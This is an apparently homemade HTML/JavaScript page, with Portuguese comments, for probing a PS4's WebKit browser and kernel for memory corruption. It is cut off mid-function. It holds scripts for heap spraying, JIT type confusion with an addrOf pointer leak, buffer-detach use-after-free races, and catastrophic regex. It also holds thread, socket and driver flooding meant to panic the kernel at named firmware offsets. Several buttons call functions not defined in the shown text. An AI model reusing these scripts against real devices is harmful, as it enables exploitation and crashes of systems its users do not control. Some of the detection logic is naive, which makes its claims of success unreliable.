<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Memory Corruption</title>
    <style> 
     
        
        /* Cores de Resultado */
        .success { color: #2ea043; font-weight: bold; } /* Verde = Corrupção Útil Detectada */
        .fail { color: #f85149; } /* Vermelho = Comportamento Seguro */
        .info { color: #e3b341; } /* Amarelo = Info de Debug */
    </style>
</head>
<body>

        <div class="section">
        <h2>WEBKIT</h2>
        <button onclick="runBmallocUAF()">TEST W1: SceNKBMalloc Reclaim UAF (Use-After-Free)</button>
        <button onclick="runProxyRace()">TEST W2: SharedWorkerProxy Message Race (Refcount Bug)</button>
        <button onclick="runJITConfusion()">TEST W3: JIT Type Confusion (AddrOf - No Crash)</button>
        <button onclick="runStringOOB()">TEST W4: StringImpl OOB Read via Slice Overflow</button>
        <button onclick="runTypedArrayDetach()">TEST W5: TypedArray Construction Detach (Buffer UAF)</button>
        <button onclick="runBmallocCoalesce()">TEST W1: SceNKBMalloc Coalesce Confusion (Heap Corruption)</button>
        <button onclick="runStringOverflow()">TEST W2: StringImpl Integer Overflow (>2GB Alloc)</button>
        <button onclick="runTypedArrayUAF()">TEST W3: TypedArray Constructor Neutering (UAF)</button>
        <button onclick="runMessagePortEntangle()">TEST W4: MessagePort IPC Entanglement (Use-After-Free)</button>
        <button onclick="runJITRegExpCrash()">TEST W5: RegExp JIT Compiler Corruption (YARR)</button>
        <button onclick="runWeakMapGC()">TEST W1: WeakMap Ephemeron Explosion (GC Panic)</button>
        <button onclick="runTreeWalker()">TEST W2: TreeWalker Detach UAF (DOM)</button>
        <button onclick="runSortConfusion()">TEST W3: Array.sort Proxy Side-Effect (OOB)</button>
        <button onclick="runRegExpStack()">TEST W4: Deep RegExp Compilation (Stack Overflow)</button>
        <button onclick="runBlobRace()">TEST W5: Blob/FileReader State Race</button>
        <button onclick="runMapTransition()">TEST W1: Map Storage Transition Race (HashMap vs Linked)</button>
        <button onclick="runFontFaceCrash()">TEST W2: FontFace Set Loading UAF (Text Shaping)</button>
        <button onclick="runWasmTable()">TEST W3: WebAssembly Table Import Type Confusion</button>
        <button onclick="runDOMNodeFilter()">TEST W4: TreeWalker NodeFilter Object Hijack</button>
        <button onclick="runStreamDetach()">TEST W5: ReadableStream BYOB Reader Detach</button>
        <button onclick="runAudioWorkletRace()">TEST W1: AudioWorklet SharedMemory Race (Thread UAF)</button>
        <button onclick="runSVGAnimationUAF()">TEST W2: SVG SMIL Animation Element Detach</button>
        <button onclick="runIntlRecursion()">TEST W3: Intl.Collator Deep Recursion (Stack Exhaustion)</button>
        <button onclick="runCanvasPattern()">TEST W4: Canvas CreatePattern Texture Use-After-Free</button>
        <button onclick="runArgumentsDeopt()">TEST W5: Arguments Object JIT Deoptimization Confusion</button>
        <button onclick="runBCE()">TEST W1: Bounds Check Elimination (JIT OOB Read)</button>
        <button onclick="runHistoryState()">TEST W2: History State Structured Clone Confusion</button>
        <button onclick="runProxyReflect()">TEST W3: Proxy.reflect Trap Type Confusion</button>
        <button onclick="runStringReplaceJIT()">TEST W4: String.replace JIT Side-Effect</button>
        <button onclick="runInstanceOfCheck()">TEST W5: Symbol.hasInstance Check Bypass</button>
        <button onclick="runJITTruncation()">TEST W1: JIT Integer Truncation (Logic Error)</button>
        <button onclick="runPrototypePollution()">TEST W2: Object Prototype Pollution (State Corruption)</button>
        <button onclick="runSpectreTiming()">TEST W3: Cache Timing Side-Channel (Spectre-Lite)</button>
        <button onclick="runRegexPoly()">TEST W4: RegExp Polymorphism Check (JIT confusion)</button>
        <button onclick="runJSONParseLogic()">TEST W5: JSON.parse Reviver Side-Effect</button>
        <button class="btn-webkit" onclick="runWebkit1()">WK: SVG UAF</button>
        <button class="btn-webkit" onclick="runWebkit2()">WK: JIT Type Conf</button>
        <button class="btn-webkit" onclick="runWebkit3()">WK: Heap Spray</button>
        <button class="btn-webkit" onclick="runWebkit4()">WK: Worker Race</button>
        <button class="btn-webkit" onclick="runWebkit5()">WK: Local Fetch</button>
        <button class="btn-webkit" onclick="runWebkit6()">WK: WebAudio UAF</button>
        <button class="btn-webkit" onclick="runWebkit7()">WK: FontFace Fuzz</button>
        <button class="btn-webkit" onclick="runWebkit8()">WK: LargeArray OOB</button>
        <button class="btn-webkit" onclick="runWebkit9()">WK: Regex Deep Stack</button>
        <button class="btn-webkit" onclick="runWebkit10()">WK: CSS Calc Recur</button>
        <button class="btn-webkit" onclick="runWebkit11()">WK: WebAssembly Spray</button>
        <button class="btn-webkit" onclick="runWebkit12()">WK: XSLT Recursion</button>
        <button class="btn-webkit" onclick="runWebkit13()">WK: Float64 Array OOB</button>
        <button class="btn-webkit" onclick="runWebkit14()">WK: Image Bitmap Race</button>
        <button class="btn-webkit" onclick="runWebkit15()">WK: Prototype Poison</button>
            <button class="btn-wk" onclick="runTest16()">16. DOM Tree Stack Overflow</button>
            <button class="btn-wk" onclick="runTest17()">17. CSS Filter Shader Bomb</button>
            <button class="btn-wk" onclick="runTest18()">18. History State OOM</button>
            <button class="btn-wk" onclick="runTest19()">19. RegExp Catastrophic</button>
            <button class="btn-wk" onclick="runTest20()">20. EventListener UAF</button>
            <button class="btn-wk" onclick="runTest26()">26. WebCrypto Key Crash</button>
            <button class="btn-wk" onclick="runTest27()">27. Proxy Trap Confusion</button>
            <button class="btn-wk" onclick="runTest28()">28. NodeIterator UAF</button>
            <button class="btn-wk" onclick="runTest29()">29. Large Rope String</button>
            <button class="btn-wk" onclick="runTest30()">30. Detached ArrayBuffer</button>
            <button class="btn-wk" onclick="runTest36()">36. TypedArray Int Overflow</button>
            <button class="btn-wk" onclick="runTest37()">37. ShadowDOM Slot Loop</button>
            <button class="btn-wk" onclick="runTest38()">38. RegEx Sticky UAF</button>
            <button class="btn-wk" onclick="runTest39()">39. JSON.stringify Recursion</button>
            <button class="btn-wk" onclick="runTest40()">40. Fetch Stream Detach</button>
            <button class="btn-wk" onclick="runTest46()">46. FinalizationRegistry UAF</button>
            <button class="btn-wk" onclick="runTest47()">47. Intl Collator Crash</button>
            <button class="btn-wk" onclick="runTest48()">48. BigInt JIT Side-Effect</button>
            <button class="btn-wk" onclick="runTest49()">49. Map/Set Iterator Invalid</button>
            <button class="btn-wk" onclick="runTest50()">50. Object DefineProp Cycle</button>
            <button class="btn-wk" onclick="runTest56()">56. Array Sort Detach</button>
            <button class="btn-wk" onclick="runTest57()">57. WASM Table Overflow</button>
            <button class="btn-wk" onclick="runTest58()">58. Canvas Path2D Infinity</button>
            <button class="btn-wk" onclick="runTest59()">59. Worker MessagePort Clone</button>
            <button class="btn-wk" onclick="runTest60()">60. TextEncoder Stream UAF</button>

    </div>

       <div class="section">
        <h2>KERNEL</h2>
        <button onclick="runHMDRing()">TEST K1: HMD Driver Ring Buffer Overwrite (hmd_cr)</button>
        <button onclick="runThreadTCB()">TEST K2: Pthread TCB Corruption (_tcb_set)</button>
        <button onclick="runSocketUAF()">TEST K3: Socket File Descriptor UAF (Connect Race)</button>
        <button onclick="runMlockOverflow()">TEST K4: Mlock Integer Overflow (vm.budgets)</button>
        <button onclick="runNamedPipeRace()">TEST K5: /dev/ Device IO Race Condition</button>
        <button onclick="runHMDOverflow()">TEST K1: HMD Driver Ring Buffer Overflow (Offset 0xB27FA3)</button>
        <button onclick="runTCBExhaustion()">TEST K2: Pthread TCB/RedZone Alloc Fail (Offset 0x3FEF1)</button>
        <button onclick="runUMTXDoubleUnlock()">TEST K3: UMTX Double Unlock Race (Offset 0x3A73F)</button>
        <button onclick="runConsoleLockout()">TEST K4: Console Driver Lock Contention (Offset 0x3FF55)</button>
        <button onclick="runSocketMbufFlood()">TEST K5: Socket Mbuf Cluster Exhaustion (Net Panic)</button>
        <button onclick="runPipeFlood()">TEST K1: Pipe Buffer Exhaustion (MessageChannel)</button>
        <button onclick="runSignalStress()">TEST K2: Worker Signal Stack Corruption</button>
        <button onclick="runKqueueTimer()">TEST K3: Kqueue Timer Filter Exhaustion</button>
        <button onclick="runNetFrag()">TEST K4: WebRTC Fragmentation (Mbuf Chain)</button>
        <button onclick="runMediaDriver()">TEST K5: Media/Camera Driver Init Race</button>
        <button onclick="runSocketOptions()">TEST K1: Socket Options Race (FreeBSD IP_OPTIONS)</button>
        <button onclick="runUmtxOp()">TEST K2: UMTX Op Code Fuzzing (Atomics Kernel Interface)</button>
        <button onclick="runStackGuard()">TEST K3: Thread Stack Guard Page Jump</button>
        <button onclick="runFDExhaustion()">TEST K4: File Descriptor Exhaustion via Blob URLs</button>
        <button onclick="runGPUCmd()">TEST K5: GPU Command Buffer Overflow (Canvas2D)</button>
        <button onclick="runFileSystemRecursion()">TEST K1: Deep Directory Recursion (Kernel Stack Overflow)</button>
        <button onclick="runSchedulerStarvation()">TEST K2: Scheduler Runqueue Starvation (Yield Flood)</button>
        <button onclick="runShmOpenAttempt()">TEST K3: Shared Memory Object Name Probing</button>
        <button onclick="runPidExhaustion()">TEST K4: PID Table Exhaustion (Process Limit)</button>
        <button onclick="runZoneAllocFrag()">TEST K5: Kernel Zone Allocator Fragmentation (UDP)</button>
        <button onclick="runUnixSocketRace()">TEST K1: Unix Domain Socket GC Race</button>
        <button onclick="runSemaphoreOverflow()">TEST K2: Semaphore Count Logical Overflow</button>
        <button onclick="runRecvMsgPeek()">TEST K3: MSG_PEEK Stack Info Leak</button>
        <button onclick="runIovecUnderflow()">TEST K4: writev/readv Iovec Length Underflow</button>
        <button onclick="runKqueueNest()">TEST K5: Kqueue Nested Filter Logic Error</button>
        <button onclick="runKernelTiming()">TEST K1: Syscall Timing Oracle (KASLR Break)</button>
        <button onclick="runRNGAnalysis()">TEST K2: Crypto RNG Entropy Bias Check</button>
        <button onclick="runTCBAlignment()">TEST K3: Thread Stack Alignment Probe</button>
        <button onclick="runSharedMemLogic()">TEST K4: SharedArrayBuffer Atomicity Logic</button>
        <button onclick="runMessagePortLogic()">TEST K5: MessageChannel Transfer Logic</button>
        <button class="btn-kernel" onclick="runKernel1()">KERN: ICC Driver</button>
        <button class="btn-kernel" onclick="runKernel2()">KERN: SRTC Time</button>
        <button class="btn-kernel" onclick="runKernel3()">KERN: Notif Flood</button>
        <button class="btn-kernel" onclick="runKernel4()">KERN: VFS Stack</button>
        <button class="btn-kernel" onclick="runKernel5()">KERN: Socket Race</button>
        <button class="btn-kernel" onclick="runKernel6()">KERN: Shader Compiler</button>
        <button class="btn-kernel" onclick="runKernel7()">KERN: Media Decoder</button>
        <button class="btn-kernel" onclick="runKernel8()">KERN: Socket Opts</button>
        <button class="btn-kernel" onclick="runKernel9()">KERN: Blob/FS Race</button>
        <button class="btn-kernel" onclick="runKernel10()">KERN: GPU Command Buffer</button>
        <button class="btn-kernel" onclick="runKernel11()">KERN: Audio DSP Crash</button>
        <button class="btn-kernel" onclick="runKernel12()">KERN: WebGL Instancing</button>
        <button class="btn-kernel" onclick="runKernel13()">KERN: SharedMem Atomic</button>
        <button class="btn-kernel" onclick="runKernel14()">KERN: FileSlice Overlap</button>
        <button class="btn-kernel" onclick="runKernel15()">KERN: GPU Texture OOM</button>
            <button class="btn-kr" onclick="runTest21()">21. WebGL Buffer SubData</button>
            <button class="btn-kr" onclick="runTest22()">22. Audio SampleRate Panic</button>
            <button class="btn-kr" onclick="runTest23()">23. Canvas toBlob Loop</button>
            <button class="btn-kr" onclick="runTest24()">24. WebRTC SDP Fuzz</button>
            <button class="btn-kr" onclick="runTest25()">25. Gamepad Poll Flood</button>
           <button class="btn-kr" onclick="runTest31()">31. WebGL Draw Elements OOB</button>
            <button class="btn-kr" onclick="runTest32()">32. Convolver Impulse OOM</button>
            <button class="btn-kr" onclick="runTest33()">33. Canvas Shadow recursion</button>
            <button class="btn-kr" onclick="runTest34()">34. WebRTC Data Channel Flood</button>
            <button class="btn-kr" onclick="runTest35()">35. GPU Texture Video Race</button>
            <button class="btn-kr" onclick="runTest41()">41. WebGL Scissor Overflow</button>
            <button class="btn-kr" onclick="runTest42()">42. FontFace Cache Thrashing</button>
            <button class="btn-kr" onclick="runTest43()">43. Video Track Buffer Race</button>
            <button class="btn-kr" onclick="runTest44()">44. GPU Shader Precision Nan</button>
            <button class="btn-kr" onclick="runTest45()">45. HRTF Audio Panner Race</button>
            <button class="btn-kr" onclick="runTest51()">51. GPU Transform Feedback</button>
            <button class="btn-kr" onclick="runTest52()">52. Compressed Texture Bomb</button>
            <button class="btn-kr" onclick="runTest53()">53. AudioWorklet Shared Race</button>
            <button class="btn-kr" onclick="runTest54()">54. WebGL2 Query Buffer OOB</button>
            <button class="btn-kr" onclick="runTest55()">55. MediaSource Keyframe Seek</button>
            <button class="btn-kr" onclick="runTest61()">61. GPU Vertex Stride Zero</button>
            <button class="btn-kr" onclick="runTest62()">62. Blob Slice Integer Wrap</button>
            <button class="btn-kr" onclick="runTest63()">63. AudioParam Ramp Math</button>
            <button class="btn-kr" onclick="runTest64()">64. Video Resolution Switch</button>
            <button class="btn-kr" onclick="runTest65()">65. WebGL Uniform Matrix OOB</button>

    </div>

    <div id="console">Initializing...</div>

    <script>
        function log(msg, type) {
            const el = document.createElement('div');
            el.className = type;
            el.innerText = `[${type.toUpperCase()}] ${msg}`;
            document.getElementById('console').appendChild(el);
        }

        // ==========================================
        // WEBKIT TESTS (Targeting SceNKBMalloc & Logic)
        // ==========================================

        // TEST W1: SceNKBMalloc Reclaim UAF
        // Tenta liberar um objeto e ocupar o mesmo espaço imediatamente com outro tipo.
        // Se a referência antiga persistir, temos Type Confusion.
        function runBmallocUAF() {
            try {
                const arr = [];
                // 1. Spray: Aloca muitos buffers de tamanho específico (ex: 128 bytes)
                for(let i=0; i<1000; i++) arr.push(new Float64Array(16)); 
                
                // 2. Punch Holes: Libera a cada 2 para fragmentar o SceNKBMalloc
                for(let i=0; i<1000; i+=2) arr[i] = null;
                
                // 3. Reclaim: Tenta alocar objetos ArrayBuffer no mesmo slot
                const reclaim = [];
                for(let i=0; i<500; i++) reclaim.push(new ArrayBuffer(128));
                
                // 4. Check: Verifica se algum Float64Array restante (os impares)
                // agora aponta para dados corrompidos (overlap).
                let corrupted = false;
                for(let i=1; i<1000; i+=2) {
                    if(arr[i] && arr[i][0] !== 0) { // Deveria ser 0
                        corrupted = true;
                        log(`Heap Corruption! Index ${i} has data: ${arr[i][0]}`, "success");
                        break;
                    }
                }
                if(!corrupted) log("Heap Isolation OK (Allocations safe).", "fail");
            } catch(e) { log(e.message, "fail"); }
        }

        // TEST W2: SharedWorkerProxy Message Race
        // Alvo: Offset 0x2E1615A (SharedWorkerThreadProxy.cpp).
        // Tenta corromper a contagem de referências do Proxy C++.
        function runProxyRace() {
            try {
                const blob = new Blob(["onconnect=e=>{var p=e.ports[0];p.onmessage=m=>p.postMessage(m.data)}"], {type:'text/javascript'});
                const url = URL.createObjectURL(blob);
                
                // Cria worker e bombardeia com mensagens complexas (Transferables)
                const sw = new SharedWorker(url, "CorruptionWorker");
                sw.port.start();
                
                const ab = new ArrayBuffer(1024);
                
                // Race: Envia mensagem e navega/destrói contexto imediatamente
                // O objetivo é que o C++ tente acessar o objeto 'ab' depois que ele foi liberado.
                setInterval(() => {
                    try { sw.port.postMessage(ab, [ab]); } catch(e){}
                }, 0);
                
                setTimeout(() => {
                    // Force GC pressure instead of navigating away
                    const trash = new ArrayBuffer(1024*1024*10); 
                    log("Proxy Stress Test executado. Verifique estabilidade.", "info");
                }, 1000);
            } catch(e) { log("Proxy Test Error: " + e.message, "fail"); }
        }

        // TEST W3: JIT Type Confusion (AddrOf)
        // O clássico. Confunde array de double com array de objetos.
        function runJITConfusion() {
            try {
                const arr = [1.1];
                const obj = {a: 1};
                function opt(a) { return a[0]; }
                
                for(let i=0; i<10000; i++) opt(arr); // Train as double
                
                const res = opt([obj]); // Pass object
                
                if (typeof res === 'number') {
                    // Converter para hex para exibir
                    log(`Type Confusion Success! Pointer leaked: ${res}`, "success");
                } else {
                    log("JIT bailou corretamente (Safe).", "fail");
                }
            } catch(e) { log("JIT Error: " + e.message, "fail"); }
        }

        // TEST W4: StringImpl OOB Read
        // Tenta ler memória fora da string usando overflow no slice.
        function runStringOOB() {
            try {
                const s = "AAAA";
                // Offset negativo gigante pode causar wrap-around se calculado como 32-bit int
                const res = s.slice(-2147483648);
                
                if (res.length !== s.length) {
                    log(`String Length Corrupted: ${res.length}`, "success");
                } else {
                    log("String slice bounds check OK.", "fail");
                }
            } catch(e) { log(e.message, "fail"); }
        }

        // TEST W5: TypedArray Construction Detach
        // Tenta criar um TypedArray de um buffer que é "desligado" durante o processo.
        function runTypedArrayDetach() {
            try {
                const src = new Uint8Array(100);
                const iter = {
                    [Symbol.iterator]() {
                        return {
                            next: () => {
                                // Detach no meio da cópia
                                if(src.buffer.byteLength > 0) {
                                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                                    w.postMessage(src.buffer, [src.buffer]);
                                }
                                return {value: 0x41, done: false};
                            }
                        };
                    }
                };
                
                try {
                    new Uint8Array(iter);
                } catch(e) {
                    if(e.name === 'TypeError') log("Detach caught (Safe).", "fail");
                    else log("Unexpected error: " + e.message, "info");
                    return;
                }
                log("Construction continued after detach (UAF Potential)!", "success");
            } catch(e) { log(e.message, "fail"); }
        }

        // ==========================================
        // KERNEL TESTS (Targeting Drivers & IO)
        // ==========================================

        // TEST K1: HMD Driver Ring Buffer Overwrite
        // Alvo: "hmd_cr:over write pos" (Kernel JSON).
        function runHMDRing() {
            log("[KERNEL] Stressing HMD Driver Ring Buffer...", "info");
            
            // Simula inputs massivos no driver VR/Gamepad
            if(navigator.getGamepads) {
                const interval = setInterval(() => {
                    const gps = navigator.getGamepads();
                    for(let gp of gps) {
                        if(gp && gp.vibrationActuator) {
                            // Envia comandos de vibração rapidíssimos para encher o buffer circular
                            gp.vibrationActuator.playEffect('dual-rumble', {
                                duration: 10, strongMagnitude: 1.0, weakMagnitude: 1.0
                            });
                            gp.vibrationActuator.reset(); // Cancelamento rápido
                        }
                    }
                }, 1); // 1ms
                
                setTimeout(() => { clearInterval(interval); log("HMD Ring Buffer Stress finished.", "info"); }, 3000);
            } else {
                log("Gamepad API not available.", "fail");
            }
        }

        // TEST K2: Pthread TCB Corruption
        // Alvo: "_tcb_set() failed" e "Pthread Internal Memory Error".
        function runThreadTCB() {
            log("[KERNEL] Attacking Thread Control Block...", "info");
            
            // Worker que usa muito TLS (Thread Local Storage)
            const blob = new Blob([`
                onmessage = () => {
                    const x = new Intl.DateTimeFormat(); // Aloca TLS
                    close(); // Mata thread
                }
            `], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            
            let i = 0;
            const interval = setInterval(() => {
                // Cria e mata threads para estressar o alocador de TCB do kernel
                for(let j=0; j<10; j++) new Worker(url).postMessage("");
                i += 10;
                if(i > 1000) { clearInterval(interval); log("TCB Stress finished.", "info"); }
            }, 10);
        }

        // TEST K3: Socket File Descriptor UAF
        // Alvo: "already connected" (Race condition).
        function runSocketUAF() {
            log("[KERNEL] Socket Connect/Close Race...", "info");
            const url = "wss://echo.websocket.org";
            
            let sock;
            try {
                // Tenta criar socket e fechar antes do handshake terminar
                // Se o kernel tentar escrever no socket fechado -> UAF
                sock = new WebSocket(url);
                sock.close();
                // Tenta reabrir imediatamente para reusar o FD
                const sock2 = new WebSocket(url); 
                sock2.close();
                log("Socket race sequence executed.", "info");
            } catch(e) { log("Socket Error: " + e.message, "fail"); }
        }

        // TEST K4: Mlock Integer Overflow
        // Alvo: "vm.budgets.mlock_total".
        function runMlockOverflow() {
            if(!window.WebAssembly) return log("Wasm off.", "fail");
            log("[KERNEL] Testing Mlock Accounting...", "info");
            
            const arr = [];
            // Aloca e libera em padrões para tentar desincronizar o contador de memória
            const iv = setInterval(() => {
                try {
                    const m = new WebAssembly.Memory({initial: 10, shared: true}); // Mlocked
                    arr.push(m);
                    if(arr.length > 50) arr.length = 0; // Bulk free
                } catch(e) {}
            }, 5);
            
            setTimeout(() => { clearInterval(iv); log("Mlock test finished.", "info"); }, 2000);
        }

        // TEST K5: /dev/ Device IO Race
        // Alvo: "/dev/console" e pipes nomeados.
        function runNamedPipeRace() {
            log("[KERNEL] /dev/ IO Race...", "info");
            
            // Tenta abrir o mesmo device múltiplas vezes
            const reqs = [];
            for(let i=0; i<10; i++) {
                reqs.push(fetch("file:///dev/console").catch(e=>{}));
            }
            
            Promise.all(reqs).then(() => log("IO Race batch finished (Check for panic).", "info"));
        }
// TEST W1: SceNKBMalloc Coalesce Confusion
        // Tenta confundir a lógica de fusão de memória (Coalesce) libertando blocos adjacentes.
        function runBmallocCoalesce() {
            log("Iniciando Bmalloc Heap Feng Shui...", "warn");
            try {
                const pointers = [];
                // 1. Aloca muitos blocos pequenos
                for(let i=0; i<2000; i++) pointers.push(new ArrayBuffer(128));
                
                // 2. Cria "queijo suíço" (Buracos)
                // Liberta alternadamente para impedir coalescência imediata
                for(let i=0; i<2000; i+=2) pointers[i] = null;
                
                // 3. Trigger Coalesce Massivo
                // Liberta os vizinhos. O alocador tenta fundir (coalesce) os blocos livres.
                // Se houver uma race condition ou erro de lógica, o heap corrompe-se.
                for(let i=1; i<2000; i+=2) pointers[i] = null;
                
                // 4. Realoca e verifica integridade
                const check = new Uint8Array(new ArrayBuffer(128));
                check.fill(0xAA);
                
                log("Heap manipulado. Se o navegador não crashou, a gestão de memória resistiu.", "safe");
            } catch(e) { log("Erro Alloc: " + e.message, "safe"); }
        }

        // TEST W2: StringImpl Integer Overflow
        // Tenta causar overflow no cálculo de tamanho da string (32-bit vs 64-bit).
        function runStringOverflow() {
            log("Tentando alocação de String > 2GB...", "warn");
            try {
                let s = "A";
                // Dobra até atingir tamanho crítico
                // O PS4 tem limite de memória por aba, mas queremos o erro de cálculo, não OOM.
                for(let i=0; i<31; i++) { // 2^31 = 2GB
                    s += s;
                }
                log("String alocada (Inesperado - devia falhar ou crashar).", "vuln");
            } catch(e) {
                if(e.message.includes("Out of memory") || e.name === "RangeError") {
                    log("Overflow prevenido com sucesso.", "safe");
                } else {
                    log("Erro genérico: " + e.message, "safe");
                }
            }
        }

        // TEST W3: TypedArray Constructor Neutering (UAF)
        // Tenta usar um buffer que foi desligado durante a construção.
        function runTypedArrayUAF() {
            log("Testando TypedArray Constructor UAF...", "warn");
            try {
                const ab = new ArrayBuffer(1024);
                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data,[e.data])"],{type:'text/js'})));
                
                let raceWon = false;
                const iter = {
                    [Symbol.iterator]() {
                        return {
                            next: () => {
                                // Neutering no meio da iteração
                                if (ab.byteLength > 0) w.postMessage(ab, [ab]);
                                return { value: 0x41, done: false };
                            }
                        };
                    }
                };
                
                try {
                    new Uint8Array(iter); // Loop infinito até crash ou erro
                } catch(e) {
                    if (e.name === "TypeError") log("Proteção contra Detach ativa.", "safe");
                    else log("Erro: " + e.message, "safe");
                }
            } catch(e) { log("Erro Fatal: " + e.message, "safe"); }
        }

        // TEST W4: MessagePort IPC Entanglement
        // Cria complexidade de IPC para forçar erro de gestão de portas.
        function runMessagePortEntangle() {
            log("Criando emaranhado de MessagePorts...", "warn");
            const channel1 = new MessageChannel();
            const channel2 = new MessageChannel();
            const channel3 = new MessageChannel();
            
            // Envia portas umas através das outras (Entanglement)
            channel1.port1.postMessage("cycle", [channel2.port1]);
            channel2.port2.postMessage("cycle", [channel3.port1]);
            channel3.port2.postMessage("cycle", [channel1.port2]);
            
            // Fecha tudo e força GC
            channel1.port1.close();
            // channel2 e 3 ficam "zumbis" no kernel se o cleanup falhar
            
            // Aloca lixo para forçar o GC a correr e tentar limpar as portas IPC
            const junk = new ArrayBuffer(50 * 1024 * 1024);
            log("IPC Stress enviado. Verifique estabilidade.", "safe");
        }

        // TEST W5: RegExp JIT Compiler Corruption
        // Patterns complexos que estressam o compilador YARR.
        function runJITRegExpCrash() {
            log("Estressando RegExp JIT...", "warn");
            try {
                // Nested quantifiers (Evil Regex)
                const re = /(x+x+)+y/;
                const str = "x".repeat(1000); // Input que causa backtracking massivo
                
                // Executa sem travar a thread (apenas teste de memória do compilador)
                // Se o compilador JIT tiver bug de stack overflow interno, crasha.
                re.test(str);
                log("RegExp JIT resistiu.", "safe");
            } catch(e) { log("Erro Regex: " + e.message, "safe"); }
        }

        // ==========================================
        // KERNEL TESTS (Alvo: libkernel.sprx)
        // ==========================================

        // TEST K1: HMD Driver Ring Buffer Overflow
        // Alvo: hmd_cr:over write pos (0xB27FA3)
        function runHMDOverflow() {
            log("[KERNEL] Inundando HMD Ring Buffer...", "warn");
            if (!navigator.getGamepads) return log("API Gamepad não disponível.", "safe");
            
            // O driver tem um buffer circular. Se escrevermos comandos mais rápido 
            // do que ele lê, o ponteiro de escrita ultrapassa o de leitura.
            const interval = setInterval(() => {
                const gps = navigator.getGamepads();
                for (let gp of gps) {
                    if (gp && gp.vibrationActuator) {
                        // Spam de comandos de vibração
                        gp.vibrationActuator.playEffect('dual-rumble', {
                            duration: 1000, strongMagnitude: 1.0, weakMagnitude: 1.0
                        });
                        // Reset imediato para gerar nova entrada no buffer
                        gp.vibrationActuator.reset();
                    }
                }
            }, 0); // 0ms delay = Velocidade máxima
            
            setTimeout(() => {
                clearInterval(interval);
                log("HMD Stress finalizado.", "safe");
            }, 3000);
        }

        // TEST K2: Pthread TCB/RedZone Alloc Fail
        // Alvo: _tcb_set() failed (0x3FEF1)
        function runTCBExhaustion() {
            log("[KERNEL] Esgotando TCB/RedZones...", "warn");
            
            // Script mínimo para o worker
            const blob = new Blob(["postMessage('ok')"], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            
            // Cria threads recursivamente ou em massa
            let count = 0;
            const max = 200; // Limite de segurança para não travar JS userland antes do kernel
            
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) {
                    const w = new Worker(url);
                    // Não terminamos imediatamente para acumular threads ativas
                    // O Kernel tem um limite de threads por processo.
                    // Queremos atingir o limite onde ele falha a alocação da Red Zone.
                    if(count > max) w.terminate(); 
                }
                count += 10;
                if(count % 50 === 0) log(`Threads iniciadas: ${count}`, "warn");
                
                if(count > 500) {
                    clearInterval(interval);
                    log("Thread limit atingido.", "safe");
                }
            }, 10);
        }

        // TEST K3: UMTX Double Unlock Race
        // Alvo: unlock error (0x3A73F)
        function runUMTXDoubleUnlock() {
            log("[KERNEL] Tentando UMTX Double Unlock...", "warn");
            
            if(!window.SharedArrayBuffer) return log("SAB off.", "safe");
            
            const sab = new SharedArrayBuffer(4);
            const i32 = new Int32Array(sab);
            
            // Worker tenta esperar (lock)
            const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{Atomics.wait(new Int32Array(e.data),0,0,100)}"],{type:'text/js'})));
            w.postMessage(sab);
            
            // Main thread tenta acordar (unlock) furiosamente
            // Se o kernel não sincronizar o estado "acordado", pode tentar desbloquear mutex livre
            let count = 0;
            const loop = setInterval(() => {
                const res = Atomics.notify(i32, 0, 1);
                count++;
                if (count > 1000) {
                    clearInterval(loop);
                    w.terminate();
                    log("UMTX Hammer finalizado.", "safe");
                }
            }, 0);
        }

        // TEST K4: Console Driver Lock Contention
        // Alvo: Can't open console (0x3FF55)
        function runConsoleLockout() {
            log("[KERNEL] Criando contenção no /dev/console...", "warn");
            
            // Spam de console.error força escrita no dispositivo de log do kernel
            // Se fizermos isso de múltiplos workers, criamos contenção no lock do driver.
            const workerCode = `
                setInterval(() => {
                    console.error("LOG_HAMMER_" + Math.random());
                }, 0);
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const workers = [];
            for(let i=0; i<4; i++) workers.push(new Worker(url));
            
            setTimeout(() => {
                workers.forEach(w => w.terminate());
                log("Console Lockout test finalizado.", "safe");
            }, 2000);
        }

        // TEST K5: Socket Mbuf Cluster Exhaustion
        // Alvo: Network Driver Panic
        function runSocketMbufFlood() {
            log("[KERNEL] Inundando Mbuf Clusters...", "warn");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            const chunk = new Uint8Array(1024 * 64); // 64KB
            
            ws.onopen = () => {
                // Envia dados sem parar e SEM LER a resposta (onmessage vazio)
                // O Kernel tem que bufferizar os dados de entrada e saída.
                // Isso consome 'mbuf clusters'. Se acabarem, a pilha de rede pânica.
                const iv = setInterval(() => {
                    if(ws.bufferedAmount < 10*1024*1024) {
                        ws.send(chunk);
                        ws.send(chunk);
                    }
                }, 1);
                
                setTimeout(() => {
                    clearInterval(iv);
                    ws.close();
                    log("Mbuf Flood parado.", "safe");
                }, 5000);
            };
            ws.onerror = (e) => log("Erro Socket (Buffer Cheio): " + e.type, "safe");
        }
 // TEST W1: WeakMap Ephemeron Explosion
        // Alvo: SceNKBMalloc e Lógica de GC.
        // WeakMaps usam "Ephemerons" (chave morre -> valor morre). Ciclos complexos estressam o GC.
        function runWeakMapGC() {
            log("Iniciando WeakMap Ephemeron Stress...", "warn");
            try {
                let maps = [];
                for(let i=0; i<1000; i++) {
                    let wm = new WeakMap();
                    let key = {id: i};
                    // Cria ciclo: O valor contém referência à chave
                    let value = { k: key, data: new Uint8Array(1024) }; 
                    wm.set(key, value);
                    maps.push(wm);
                    
                    // Solta referência forte
                    key = null; 
                }
                
                // Força alocação massiva para disparar GC
                const trash = new ArrayBuffer(50 * 1024 * 1024);
                log("GC Ephemeron Ciclo concluído. Se não crashar, seguro.", "safe");
            } catch(e) { log(e.message, "safe"); }
        }

        // TEST W2: TreeWalker Detach UAF
        // Alvo: DOM Node Iterator (C++ Objects).
        // Remove nós do DOM enquanto um TreeWalker está ativo sobre eles.
        function runTreeWalker() {
            log("Testando TreeWalker Detach...", "warn");
            try {
                const root = document.createElement('div');
                root.innerHTML = "<span>A</span><span>B</span><span>C</span>";
